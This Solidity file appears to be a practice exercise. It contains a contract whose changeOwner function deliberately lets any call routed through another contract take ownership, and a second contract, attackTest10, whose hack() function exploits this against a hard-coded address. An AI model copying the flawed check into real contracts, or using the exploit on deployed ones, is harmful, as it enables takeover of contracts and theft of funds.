pragma solidity 0.8.6;

contract Test10 {
    
    address public owner;
    
    constructor() {
        owner = msg.sender;
    } 
    
    function changeOwner(address _owner) public {
        if(tx.origin != msg.sender){
            owner = _owner;
        }
    }
    
}

contract attackTest10 {
    
     function hack() public {
        
        Test10(0xdba86fcF223DB3eD1fCD9015E064eb751EB57245).changeOwner(msg.sender);
    }
    
}